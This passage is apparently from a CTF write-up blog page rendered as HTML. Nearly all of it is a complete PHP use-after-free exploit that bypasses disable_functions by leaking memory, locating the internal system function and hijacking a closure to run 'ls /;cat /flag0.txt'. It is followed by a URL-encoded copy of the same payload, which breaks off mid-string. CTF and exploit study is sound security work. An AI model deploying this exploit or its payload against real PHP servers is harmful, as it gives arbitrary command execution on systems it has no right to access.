class=\"line\">205</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=<span class=\"meta\">?&gt;</span><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"title function_ invoke__\">pwn</span>(<span class=\"string\">&quot;ls /;cat /flag0.txt&quot;</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">pwn</span>(<span class=\"params\"><span class=\"variable\">$cmd</span></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">global</span> <span class=\"variable\">$abc</span>, <span class=\"variable\">$helper</span>, <span class=\"variable\">$backtrace</span>;</span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Vuln</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$a</span>;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123; </span><br><span class=\"line\">            <span class=\"keyword\">global</span> <span class=\"variable\">$backtrace</span>; </span><br><span class=\"line\">            <span class=\"keyword\">unset</span>(<span class=\"variable language_\">$this</span>-&gt;a);</span><br><span class=\"line\">            <span class=\"variable\">$backtrace</span> = (<span class=\"keyword\">new</span> <span class=\"built_in\">Exception</span>)-&gt;<span class=\"title function_ invoke__\">getTrace</span>(); <span class=\"comment\"># ;)</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!<span class=\"keyword\">isset</span>(<span class=\"variable\">$backtrace</span>[<span class=\"number\">1</span>][<span class=\"string\">&#x27;args&#x27;</span>])) &#123; <span class=\"comment\"># PHP &gt;= 7.4</span></span><br><span class=\"line\">                <span class=\"variable\">$backtrace</span> = <span class=\"title function_ invoke__\">debug_backtrace</span>();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Helper</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"variable\">$a</span>, <span class=\"variable\">$b</span>, <span class=\"variable\">$c</span>, <span class=\"variable\">$d</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">str2ptr</span>(<span class=\"params\">&amp;<span class=\"variable\">$str</span>, <span class=\"variable\">$p</span> = <span class=\"number\">0</span>, <span class=\"variable\">$s</span> = <span class=\"number\">8</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$address</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"variable\">$j</span> = <span class=\"variable\">$s</span>-<span class=\"number\">1</span>; <span class=\"variable\">$j</span> &gt;= <span class=\"number\">0</span>; <span class=\"variable\">$j</span>--) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$address</span> &lt;&lt;= <span class=\"number\">8</span>;</span><br><span class=\"line\">            <span class=\"variable\">$address</span> |= <span class=\"title function_ invoke__\">ord</span>(<span class=\"variable\">$str</span>[<span class=\"variable\">$p</span>+<span class=\"variable\">$j</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$address</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">ptr2str</span>(<span class=\"params\"><span class=\"variable\">$ptr</span>, <span class=\"variable\">$m</span> = <span class=\"number\">8</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$out</span> = <span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"variable\">$i</span>=<span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"variable\">$m</span>; <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$out</span> .= <span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&#x27;%c&#x27;</span>,<span class=\"variable\">$ptr</span> &amp; <span class=\"number\">0xff</span>);</span><br><span class=\"line\">            <span class=\"variable\">$ptr</span> &gt;&gt;= <span class=\"number\">8</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$out</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">write</span>(<span class=\"params\">&amp;<span class=\"variable\">$str</span>, <span class=\"variable\">$p</span>, <span class=\"variable\">$v</span>, <span class=\"variable\">$n</span> = <span class=\"number\">8</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$i</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"variable\">$n</span>; <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$str</span>[<span class=\"variable\">$p</span> + <span class=\"variable\">$i</span>] = <span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&#x27;%c&#x27;</span>,<span class=\"variable\">$v</span> &amp; <span class=\"number\">0xff</span>);</span><br><span class=\"line\">            <span class=\"variable\">$v</span> &gt;&gt;= <span class=\"number\">8</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">leak</span>(<span class=\"params\"><span class=\"variable\">$addr</span>, <span class=\"variable\">$p</span> = <span class=\"number\">0</span>, <span class=\"variable\">$s</span> = <span class=\"number\">8</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">global</span> <span class=\"variable\">$abc</span>, <span class=\"variable\">$helper</span>;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$abc</span>, <span class=\"number\">0x68</span>, <span class=\"variable\">$addr</span> + <span class=\"variable\">$p</span> - <span class=\"number\">0x10</span>);</span><br><span class=\"line\">        <span class=\"variable\">$leak</span> = <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$helper</span>-&gt;a);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(<span class=\"variable\">$s</span> != <span class=\"number\">8</span>) &#123; <span class=\"variable\">$leak</span> %= <span class=\"number\">2</span> &lt;&lt; (<span class=\"variable\">$s</span> * <span class=\"number\">8</span>) - <span class=\"number\">1</span>; &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"variable\">$leak</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">parse_elf</span>(<span class=\"params\"><span class=\"variable\">$base</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$e_type</span> = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$base</span>, <span class=\"number\">0x10</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"variable\">$e_phoff</span> = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$base</span>, <span class=\"number\">0x20</span>);</span><br><span class=\"line\">        <span class=\"variable\">$e_phentsize</span> = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$base</span>, <span class=\"number\">0x36</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">        <span class=\"variable\">$e_phnum</span> = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$base</span>, <span class=\"number\">0x38</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"variable\">$e_phnum</span>; <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$header</span> = <span class=\"variable\">$base</span> + <span class=\"variable\">$e_phoff</span> + <span class=\"variable\">$i</span> * <span class=\"variable\">$e_phentsize</span>;</span><br><span class=\"line\">            <span class=\"variable\">$p_type</span>  = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$header</span>, <span class=\"number\">0</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\">            <span class=\"variable\">$p_flags</span> = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$header</span>, <span class=\"number\">4</span>, <span class=\"number\">4</span>);</span><br><span class=\"line\">            <span class=\"variable\">$p_vaddr</span> = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$header</span>, <span class=\"number\">0x10</span>);</span><br><span class=\"line\">            <span class=\"variable\">$p_memsz</span> = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$header</span>, <span class=\"number\">0x28</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$p_type</span> == <span class=\"number\">1</span> &amp;&amp; <span class=\"variable\">$p_flags</span> == <span class=\"number\">6</span>) &#123; <span class=\"comment\"># PT_LOAD, PF_Read_Write</span></span><br><span class=\"line\">                <span class=\"comment\"># handle pie</span></span><br><span class=\"line\">                <span class=\"variable\">$data_addr</span> = <span class=\"variable\">$e_type</span> == <span class=\"number\">2</span> ? <span class=\"variable\">$p_vaddr</span> : <span class=\"variable\">$base</span> + <span class=\"variable\">$p_vaddr</span>;</span><br><span class=\"line\">                <span class=\"variable\">$data_size</span> = <span class=\"variable\">$p_memsz</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(<span class=\"variable\">$p_type</span> == <span class=\"number\">1</span> &amp;&amp; <span class=\"variable\">$p_flags</span> == <span class=\"number\">5</span>) &#123; <span class=\"comment\"># PT_LOAD, PF_Read_exec</span></span><br><span class=\"line\">                <span class=\"variable\">$text_size</span> = <span class=\"variable\">$p_memsz</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!<span class=\"variable\">$data_addr</span> || !<span class=\"variable\">$text_size</span> || !<span class=\"variable\">$data_size</span>)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">        <span class=\"keyword\">return</span> [<span class=\"variable\">$data_addr</span>, <span class=\"variable\">$text_size</span>, <span class=\"variable\">$data_size</span>];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_basic_funcs</span>(<span class=\"params\"><span class=\"variable\">$base</span>, <span class=\"variable\">$elf</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">list</span>(<span class=\"variable\">$data_addr</span>, <span class=\"variable\">$text_size</span>, <span class=\"variable\">$data_size</span>) = <span class=\"variable\">$elf</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"variable\">$data_size</span> / <span class=\"number\">8</span>; <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$leak</span> = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$data_addr</span>, <span class=\"variable\">$i</span> * <span class=\"number\">8</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$leak</span> - <span class=\"variable\">$base</span> &gt; <span class=\"number\">0</span> &amp;&amp; <span class=\"variable\">$leak</span> - <span class=\"variable\">$base</span> &lt; <span class=\"variable\">$data_addr</span> - <span class=\"variable\">$base</span>) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$deref</span> = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$leak</span>);</span><br><span class=\"line\">                <span class=\"comment\"># &#x27;constant&#x27; constant check</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"variable\">$deref</span> != <span class=\"number\">0x746e6174736e6f63</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"variable\">$leak</span> = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$data_addr</span>, (<span class=\"variable\">$i</span> + <span class=\"number\">4</span>) * <span class=\"number\">8</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$leak</span> - <span class=\"variable\">$base</span> &gt; <span class=\"number\">0</span> &amp;&amp; <span class=\"variable\">$leak</span> - <span class=\"variable\">$base</span> &lt; <span class=\"variable\">$data_addr</span> - <span class=\"variable\">$base</span>) &#123;</span><br><span class=\"line\">                <span class=\"variable\">$deref</span> = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$leak</span>);</span><br><span class=\"line\">                <span class=\"comment\"># &#x27;bin2hex&#x27; constant check</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span>(<span class=\"variable\">$deref</span> != <span class=\"number\">0x786568326e6962</span>)</span><br><span class=\"line\">                    <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">continue</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"variable\">$data_addr</span> + <span class=\"variable\">$i</span> * <span class=\"number\">8</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_binary_base</span>(<span class=\"params\"><span class=\"variable\">$binary_leak</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$base</span> = <span class=\"number\">0</span>;</span><br><span class=\"line\">        <span class=\"variable\">$start</span> = <span class=\"variable\">$binary_leak</span> &amp; <span class=\"number\">0xfffffffffffff000</span>;</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"number\">0x1000</span>; <span class=\"variable\">$i</span>++) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$addr</span> = <span class=\"variable\">$start</span> - <span class=\"number\">0x1000</span> * <span class=\"variable\">$i</span>;</span><br><span class=\"line\">            <span class=\"variable\">$leak</span> = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$addr</span>, <span class=\"number\">0</span>, <span class=\"number\">7</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$leak</span> == <span class=\"number\">0x10102464c457f</span>) &#123; <span class=\"comment\"># ELF header</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"variable\">$addr</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get_system</span>(<span class=\"params\"><span class=\"variable\">$basic_funcs</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$addr</span> = <span class=\"variable\">$basic_funcs</span>;</span><br><span class=\"line\">        <span class=\"keyword\">do</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$f_entry</span> = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$addr</span>);</span><br><span class=\"line\">            <span class=\"variable\">$f_name</span> = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$f_entry</span>, <span class=\"number\">0</span>, <span class=\"number\">6</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$f_name</span> == <span class=\"number\">0x6d6574737973</span>) &#123; <span class=\"comment\"># system</span></span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$addr</span> + <span class=\"number\">8</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"variable\">$addr</span> += <span class=\"number\">0x20</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">while</span>(<span class=\"variable\">$f_entry</span> != <span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">trigger_uaf</span>(<span class=\"params\"><span class=\"variable\">$arg</span></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\"># str_shuffle prevents opcache string interning</span></span><br><span class=\"line\">        <span class=\"variable\">$arg</span> = <span class=\"title function_ invoke__\">str_shuffle</span>(<span class=\"string\">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class=\"line\">        <span class=\"variable\">$vuln</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Vuln</span>();</span><br><span class=\"line\">        <span class=\"variable\">$vuln</span>-&gt;a = <span class=\"variable\">$arg</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">stristr</span>(PHP_OS, <span class=\"string\">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"variable\">$n_alloc</span> = <span class=\"number\">10</span>; <span class=\"comment\"># increase this value if UAF fails</span></span><br><span class=\"line\">    <span class=\"variable\">$contiguous</span> = [];</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"variable\">$n_alloc</span>; <span class=\"variable\">$i</span>++)</span><br><span class=\"line\">        <span class=\"variable\">$contiguous</span>[] = <span class=\"title function_ invoke__\">str_shuffle</span>(<span class=\"string\">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"title function_ invoke__\">trigger_uaf</span>(<span class=\"string\">&#x27;x&#x27;</span>);</span><br><span class=\"line\">    <span class=\"variable\">$abc</span> = <span class=\"variable\">$backtrace</span>[<span class=\"number\">1</span>][<span class=\"string\">&#x27;args&#x27;</span>][<span class=\"number\">0</span>];</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"variable\">$helper</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Helper</span>;</span><br><span class=\"line\">    <span class=\"variable\">$helper</span>-&gt;b = <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"><span class=\"variable\">$x</span></span>) </span>&#123; &#125;;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$abc</span>) == <span class=\"number\">79</span> || <span class=\"title function_ invoke__\">strlen</span>(<span class=\"variable\">$abc</span>) == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;UAF failed&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># leaks</span></span><br><span class=\"line\">    <span class=\"variable\">$closure_handlers</span> = <span class=\"title function_ invoke__\">str2ptr</span>(<span class=\"variable\">$abc</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">    <span class=\"variable\">$php_heap</span> = <span class=\"title function_ invoke__\">str2ptr</span>(<span class=\"variable\">$abc</span>, <span class=\"number\">0x58</span>);</span><br><span class=\"line\">    <span class=\"variable\">$abc_addr</span> = <span class=\"variable\">$php_heap</span> - <span class=\"number\">0xc8</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># fake value</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$abc</span>, <span class=\"number\">0x60</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$abc</span>, <span class=\"number\">0x70</span>, <span class=\"number\">6</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># fake reference</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$abc</span>, <span class=\"number\">0x10</span>, <span class=\"variable\">$abc_addr</span> + <span class=\"number\">0x60</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$abc</span>, <span class=\"number\">0x18</span>, <span class=\"number\">0xa</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"variable\">$closure_obj</span> = <span class=\"title function_ invoke__\">str2ptr</span>(<span class=\"variable\">$abc</span>, <span class=\"number\">0x20</span>);</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"variable\">$binary_leak</span> = <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$closure_handlers</span>, <span class=\"number\">8</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!(<span class=\"variable\">$base</span> = <span class=\"title function_ invoke__\">get_binary_base</span>(<span class=\"variable\">$binary_leak</span>))) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!(<span class=\"variable\">$elf</span> = <span class=\"title function_ invoke__\">parse_elf</span>(<span class=\"variable\">$base</span>))) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!(<span class=\"variable\">$basic_funcs</span> = <span class=\"title function_ invoke__\">get_basic_funcs</span>(<span class=\"variable\">$base</span>, <span class=\"variable\">$elf</span>))) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"keyword\">if</span>(!(<span class=\"variable\">$zif_system</span> = <span class=\"title function_ invoke__\">get_system</span>(<span class=\"variable\">$basic_funcs</span>))) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># fake closure object</span></span><br><span class=\"line\">    <span class=\"variable\">$fake_obj_offset</span> = <span class=\"number\">0xd0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span>(<span class=\"variable\">$i</span> = <span class=\"number\">0</span>; <span class=\"variable\">$i</span> &lt; <span class=\"number\">0x110</span>; <span class=\"variable\">$i</span> += <span class=\"number\">8</span>) &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$abc</span>, <span class=\"variable\">$fake_obj_offset</span> + <span class=\"variable\">$i</span>, <span class=\"title function_ invoke__\">leak</span>(<span class=\"variable\">$closure_obj</span>, <span class=\"variable\">$i</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"comment\"># pwn</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$abc</span>, <span class=\"number\">0x20</span>, <span class=\"variable\">$abc_addr</span> + <span class=\"variable\">$fake_obj_offset</span>);</span><br><span class=\"line\">    <span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$abc</span>, <span class=\"number\">0xd0</span> + <span class=\"number\">0x38</span>, <span class=\"number\">1</span>, <span class=\"number\">4</span>); <span class=\"comment\"># internal func type</span></span><br><span class=\"line\">    <span class=\"title function_ invoke__\">write</span>(<span class=\"variable\">$abc</span>, <span class=\"number\">0xd0</span> + <span class=\"number\">0x68</span>, <span class=\"variable\">$zif_system</span>); <span class=\"comment\"># internal func handler</span></span><br><span class=\"line\"> </span><br><span class=\"line\">    (<span class=\"variable\">$helper</span>-&gt;b)(<span class=\"variable\">$cmd</span>);</span><br><span class=\"line\">    <span class=\"keyword\">exit</span>();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t直接贴一个 payload：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">c=%<span class=\"number\">3</span>f%<span class=\"number\">3</span>e%<span class=\"number\">3</span>c%<span class=\"number\">3</span>fphp%<span class=\"number\">0</span>apwn(%<span class=\"number\">22</span>ls+%<span class=\"number\">2</span>f%<span class=\"number\">3</span>bcat+%<span class=\"number\">2</span>fflag0.txt%<span class=\"number\">22</span>)%<span class=\"number\">3</span>b%<span class=\"number\">0</span>a%<span class=\"number\">0</span>afunction+<span class=\"title function_ invoke__\">pwn</span>(%<span class=\"number\">24</span>cmd)+%<span class=\"number\">7</span>b%<span class=\"number\">0</span>a++++<span class=\"keyword\">global</span>+%<span class=\"number\">24</span>abc%<span class=\"number\">2</span>c+%<span class=\"number\">24</span>helper%<span class=\"number\">2</span>c+%<span class=\"number\">24</span>backtrace%<span class=\"number\">3</span>b%<span class=\"number\">0</span>a++++<span class=\"class\"><span class=\"keyword\">class</span>+<span class=\"title\">Vuln</span>+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">public</span>+%24<span class=\"title\">a</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">public</span>+<span class=\"title\">function</span>+<span class=\"title\">__destruct</span>()+%7<span class=\"title\">b</span>+%0<span class=\"title\">a</span>++++++++++++<span class=\"title\">global</span>+%24<span class=\"title\">backtrace</span>%3<span class=\"title\">b</span>+%0<span class=\"title\">a</span>++++++++++++<span class=\"title\">unset</span>(%24<span class=\"title\">this</span>-%3<span class=\"title\">ea</span>)%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%24<span class=\"title\">backtrace</span>+%3<span class=\"title\">d</span>+(<span class=\"title\">new</span>+<span class=\"title\">Exception</span>)-%3<span class=\"title\">egetTrace</span>()%3<span class=\"title\">b</span>+%23+%3<span class=\"title\">b</span>)%0<span class=\"title\">a</span>++++++++++++<span class=\"title\">if</span>(!<span class=\"title\">isset</span>(%24<span class=\"title\">backtrace</span>%5<span class=\"title\">b1</span>%5<span class=\"title\">d</span>%5<span class=\"title\">b</span>%27<span class=\"title\">args</span>%27%5<span class=\"title\">d</span>))+%7<span class=\"title\">b</span>+%23+<span class=\"title\">PHP</span>+%3<span class=\"title\">e</span>%3<span class=\"title\">d</span>+7.4%0<span class=\"title\">a</span>++++++++++++++++%24<span class=\"title\">backtrace</span>+%3<span class=\"title\">d</span>+<span class=\"title\">debug_backtrace</span>()%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>++++++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">class</span>+<span class=\"title\">Helper</span>+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">public</span>+%24<span class=\"title\">a</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">b</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">c</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">d</span>%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++%7<span class=\"title\">d</span>%0<span class=\"title\">a</span>%0<span class=\"title\">a</span>++++<span class=\"title\">function</span>+<span class=\"title\">str2ptr</span>(%26%24<span class=\"title\">str</span>%2<span class=\"title\">c</span>+%24<span class=\"title\">p</span>+%3<span class=\"title\">d</span>+0%2<span class=\"title\">c</span>+%24<span class=\"title\">s</span>+%3<span class=\"title\">d</span>+8)+%7<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++%24<span class=\"title\">address</span>+%3<span class=\"title\">d</span>+0%3<span class=\"title\">b</span>%0<span class=\"title\">a</span>++++++++<span class=\"title\">for</span>(%24<span class=\"title\">j</span>+%3<span class=\"title\">d</span>+%24<span class=\"title\">s</span>-1%3<span class=\"title\">b</span>+%24<span class=\"title\">j</span>+%3<span class=\"title\">e</span>%3<span class=\"title\">d</span>+0%3<span class=\"title\">b</span>+%24<span class=\"title\">j</span>--)+%7<span class=\"title\">b</span>%0<span 